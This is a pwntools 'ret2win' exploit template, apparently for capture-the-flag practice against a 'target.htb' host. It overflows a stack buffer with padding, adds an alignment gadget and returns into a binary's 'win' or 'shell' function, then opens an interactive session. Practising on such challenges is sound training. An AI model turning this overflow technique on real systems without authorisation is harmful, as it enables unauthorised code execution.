#!/usr/bin/env python3
"""
ret2win Exploit Template
========================
Simple return-to-win-function exploit.

Requirements:
- Buffer overflow vulnerability
- No PIE (or known binary base)
- No stack canary (or canary bypassed)
- Win function exists in binary

Usage:
    python3 ret2win.py          # Local
    python3 ret2win.py GDB      # With GDB
    python3 ret2win.py REMOTE   # Remote
"""
from pwn import *

# === CONFIGURATION ===
BINARY = './binary'
OFFSET = 72              # TODO: Offset to return address (find with cyclic)

HOST = 'target.htb'
PORT = 1337

# === SETUP ===
elf = ELF(BINARY)
context.binary = elf

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    elif args.GDB:
        return gdb.debug(BINARY, 'b main\nc')
    else:
        return process(BINARY)

def main():
    io = conn()

    # Find win function address
    # Common names: win, flag, shell, backdoor, give_shell
    win = elf.symbols.get('win') or elf.symbols.get('flag') or elf.symbols.get('shell')

    if not win:
        log.error("Win function not found! Check with: nm ./binary | grep -i win")
        return

    log.info(f"Win function at: {hex(win)}")

    # For x86_64: May need ret gadget for stack alignment (movaps issue)
    # Uncomment if you get SIGSEGV on movaps instruction
    ret = None
    if context.arch == 'amd64':
        try:
            ret = next(elf.search(asm('ret')))
            log.info(f"ret gadget at: {hex(ret)}")
        except StopIteration:
            pass

    # Build payload
    payload = b'A' * OFFSET

    # Add ret for stack alignment if needed (x86_64)
    if ret and context.arch == 'amd64':
        payload += p64(ret)

    # Return to win function
    payload += p64(win)

    log.info(f"Payload: {len(payload)} bytes")
    log.info(f"Sending payload...")

    io.sendline(payload)

    # Get flag or shell
    io.interactive()

if __name__ == '__main__':
    main()
